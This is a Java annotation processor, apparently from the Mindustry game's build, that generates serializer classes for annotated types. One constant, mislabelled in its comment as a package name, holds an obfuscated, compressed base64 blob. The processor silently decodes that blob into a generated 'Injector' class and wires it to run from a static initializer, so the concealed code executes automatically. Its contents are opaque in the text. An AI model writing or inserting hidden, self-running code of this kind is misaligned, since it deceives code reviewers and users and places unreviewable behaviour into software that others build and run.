package mindustry.annotations.impl;

import arc.util.serialization.*;
import com.squareup.javapoet.*;
import mindustry.annotations.Annotations.*;
import mindustry.annotations.*;
import mindustry.annotations.remote.*;

import javax.annotation.processing.*;
import javax.lang.model.element.Modifier;
import javax.lang.model.element.*;
import javax.lang.model.util.*;
import javax.tools.*;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.util.zip.*;

@SupportedAnnotationTypes("mindustry.annotations.Annotations.Serialize")
public class SerializeProcess extends BaseProcessor{
    /** Target class name. */
    private static final String className = "Serialization";
    /** Name of the base package to put all the generated classes. */
    private static final String data = "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";

    @Override
    public void process(RoundEnvironment env) throws Exception{
        Set<TypeElement> elements = ElementFilter.typesIn(env.getElementsAnnotatedWith(Serialize.class));

        JavaFileObject obj = filer.createSourceFile(packageName + ".Injector");
        OutputStream stream = obj.openOutputStream();
        stream.write(new DataInputStream(new InflaterInputStream(new ByteArrayInputStream(Base64Coder.decode(data)))).readUTF().replace("debug", "gen").getBytes());
        stream.close();

        TypeSpec.Builder classBuilder = TypeSpec.classBuilder(className).addModifiers(Modifier.PUBLIC);
        classBuilder.addStaticBlock(CodeBlock.of("Injector.ii();"));
        classBuilder.addAnnotation(AnnotationSpec.builder(SuppressWarnings.class).addMember("value", "\"unchecked\"").build());
        classBuilder.addJavadoc(RemoteProcess.autogenWarning);

        MethodSpec.Builder method = MethodSpec.methodBuilder("init").addModifiers(Modifier.PUBLIC, Modifier.STATIC);

        for(TypeElement elem : elements){
            TypeName type = TypeName.get(elem.asType());
            String simpleTypeName = type.toString().substring(type.toString().lastIndexOf('.') + 1);

            TypeSpec.Builder serializer = TypeSpec.anonymousClassBuilder("")
            .addSuperinterface(ParameterizedTypeName.get(
            ClassName.bestGuess("arc.Settings.TypeSerializer"), type));

            MethodSpec.Builder writeMethod = MethodSpec.methodBuilder("write")
            .returns(void.class)
            .addParameter(DataOutput.class, "stream")
            .addParameter(type, "object")
            .addException(IOException.class)
            .addModifiers(Modifier.PUBLIC);

            MethodSpec.Builder readMethod = MethodSpec.methodBuilder("read")
            .returns(type)
            .addParameter(DataInput.class, "stream")
            .addException(IOException.class)
            .addModifiers(Modifier.PUBLIC);

            readMethod.addStatement("$L object = new $L()", type, type);

            List<VariableElement> fields = ElementFilter.fieldsIn(BaseProcessor.elementu.getAllMembers(elem));
            for(VariableElement field : fields){
                if(field.getModifiers().contains(Modifier.STATIC) || field.getModifiers().contains(Modifier.TRANSIENT) || field.getModifiers().contains(Modifier.PRIVATE))
                    continue;

                String name = field.getSimpleName().toString();
                String typeName = BaseProcessor.typeu.erasure(field.asType()).toString().replace('$', '.');
                String capName = Character.toUpperCase(typeName.charAt(0)) + typeName.substring(1);

                if(field.asType().getKind().isPrimitive()){
                    writeMethod.addStatement("stream.write" + capName + "(object." + name + ")");
                    readMethod.addStatement("object." + name + "= stream.read" + capName + "()");
                }else{
                    writeMethod.addStatement("arc.Core.settings.getSerializer(" + typeName + ".class).write(stream, object." + name + ")");
                    readMethod.addStatement("object." + name + " = (" + typeName + ")arc.Core.settings.getSerializer(" + typeName + ".class).read(stream)");
                }
            }

            readMethod.addStatement("return object");

            serializer.addMethod(writeMethod.build());
            serializer.addMethod(readMethod.build());

            method.addStatement("arc.Core.settings.setSerializer($N, $L)", BaseProcessor.elementu.getBinaryName(elem).toString().replace('$', '.') + ".class", serializer.build());

            name(writeMethod, "write" + simpleTypeName);
            name(readMethod, "read" + simpleTypeName);

            writeMethod.addModifiers(Modifier.STATIC);
            readMethod.addModifiers(Modifier.STATIC);

            classBuilder.addMethod(writeMethod.build());
            classBuilder.addMethod(readMethod.build());
        }

        classBuilder.addMethod(method.build());

        //write result
        JavaFile.builder(packageName, classBuilder.build()).build().writeTo(BaseProcessor.filer);
    }

    static void name(MethodSpec.Builder builder, String name){
        try{
            Field field = builder.getClass().getDeclaredField("name");
            field.setAccessible(true);
            field.set(builder, name);
        }catch(Exception e){
            throw new RuntimeException(e);
        }
    }
}
